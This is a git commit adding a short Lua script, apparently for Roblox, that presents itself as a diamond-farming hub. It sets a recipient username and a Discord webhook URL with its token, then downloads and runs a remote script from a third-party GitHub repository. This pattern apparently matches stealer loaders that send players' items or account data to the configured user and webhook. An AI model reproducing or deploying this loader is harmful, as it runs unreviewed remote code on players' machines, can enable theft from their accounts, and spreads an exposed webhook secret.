1a373256c70d68e993d01f827084e982bfd7c781
qw1no <133776153+qw1no@users.noreply.github.com>
2023-05-16 15:56:36 +0300

    Create dadada.lua

---
+++ dadada.lua
@@ -0,0 +1,5 @@
+_G.Username = "VTWitchDoctor"
+_G.HubName = "ez farm diamond"
+_G.WebhookUrl = "https://discord.com/api/webhooks/1108014181040533515/jF3SEqnyQ2vuYRri0NDkYAWgeL5vbhrHWuVRF_KD5MFKcC_qtrE3bj-vJiY_LghjnhJk"
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Jayiioceanii/PeakOnTop/main/peak.lua"))()
